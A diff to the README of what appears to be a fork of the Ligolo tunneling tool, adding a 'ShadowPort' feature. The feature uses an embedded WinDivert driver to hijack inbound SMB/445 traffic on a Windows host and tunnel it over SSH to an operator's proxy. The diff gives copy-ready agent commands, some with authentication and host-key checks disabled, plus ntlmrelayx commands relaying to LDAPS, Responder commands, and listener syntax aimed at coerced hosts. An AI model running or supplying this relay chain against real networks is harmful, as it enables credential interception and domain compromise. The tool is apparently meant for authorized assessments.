@@ -7,7 +7,8 @@ deserves full credit for the original project and core tunneling engine. This
 SSH fork is not an official upstream release.
 
 This release contains proxy and agent binaries for Windows/Linux AMD64/ARM64.
-The Garble agent accepts the same flags as the normal agent.
+The Garble agent accepts the same flags as the normal agent. The Windows AMD64
+directory also contains `agent-shadow.exe` and `agent-shadow-garble.exe`.
 
 SSH is the real agent-to-proxy transport. The proxy always needs an SSH host
 key because it is required to establish an encrypted SSH connection. In
@@ -159,6 +160,110 @@ the proxy. Enable this mode only for the assessment window and restrict the
 listener with firewall rules when possible.
 
 Both sides must opt in. A no-auth agent is rejected by a normal proxy.
+
+## ShadowPort SMB/445 (Windows AMD64)
+
+Use one of the separate ShadowPort binaries when Windows PID 4 already owns
+TCP/445. ShadowPort source-selects inbound SMB, translates it to an internal
+port, and carries the accepted stream to the proxy through SSH. It does not
+need WebDAV and leaves non-selected sources on the native SMB service.
+
+It needs elevated Administrator, not SYSTEM. The official signed WinDivert
+2.2.2 AMD64 driver is embedded and hash-pinned. It is extracted to a protected
+temporary directory only while a ShadowPort listener is active, then removed.
+The target needs only the EXE, but Windows still requires the driver to be
+materialized temporarily on disk when loaded. The agent uses built-in Windows
+PowerShell to add a temporary firewall rule scoped to the exact internal IP,
+port, and source allowlist, then removes it during listener shutdown.
+
+With an SSH agent key:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-key .\agent `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+Without an agent key, but with proxy fingerprint verification:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-host-key-fingerprint "SHA256:REPLACE_WITH_PROXY_FINGERPRINT" `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+Binary-only/no pinning:
+
+```powershell
+.\agent-shadow.exe `
+  -connect ssh://PROXY_IP:22 `
+  -ssh-user ligolo `
+  -ssh-insecure-no-auth `
+  -ssh-insecure-ignore-host-key `
+  -allow-shadow-port `
+  -retry `
+  -reconnect
+```
+
+`agent-shadow-garble.exe` uses the same flags.
+
+Run an SMB receiver beside the proxy, for example current Impacket:
+
+```bash
+sudo ntlmrelayx.py -ip 127.0.0.1 --smb-port 8445 -smb2support -t ldaps://RELAY_TARGET
+```
+
+Responder is also supported:
+
+```bash
+sudo responder -I PROXY_INTERFACE -v
+```
+
+Point the listener at `PROXY_INTERFACE_IPV4:445` instead of
+`127.0.0.1:8445` when using Responder.
+
+Select the agent in the proxy console:
+
+```text
+session
+listener_add --tcp --addr AGENT_IPV4:445 --to 127.0.0.1:8445 --shadow-port --shadow-internal-port 8445 --shadow-source COERCED_HOST_IPV4_OR_CIDR
+```
+
+Use the agent's exact IPv4 address, not `0.0.0.0`. Multiple sources/CIDRs are
+comma-separated. The internal port must be free on the agent; `--to` selects
+the independent proxy-side receiver port. `listener_stop` closes the diversion
+and removes its runtime files and firewall rule. The Web UI exposes the same
+fields when the agent advertises `shadowport-smb-v1`.
+
+Inspect and verify cleanup from elevated Windows PowerShell:
+
+```powershell
+Get-NetTCPConnection -State Listen |
+  Where-Object LocalPort -In 445,8445 |
+  Format-Table LocalAddress,LocalPort,OwningProcess
+Get-NetFirewallRule -DisplayName 'Ligolo ShadowPort *' -ErrorAction SilentlyContinue
+Get-ChildItem -LiteralPath $env:TEMP -Directory -Filter 'ligolo-shadowport-*'
+```
+
+After `listener_stop`, the firewall and directory queries should be empty. If
+the process was forcibly killed, remove only the feature's residue:
+
+```powershell
+Get-NetFirewallRule -Name 'LigoloShadowPort-*' -ErrorAction SilentlyContinue |
+  Remove-NetFirewallRule
+Get-ChildItem -LiteralPath $env:TEMP -Directory -Filter 'ligolo-shadowport-*' |
+  Remove-Item -Recurse -Force
+```
 
 ## Web UI
 
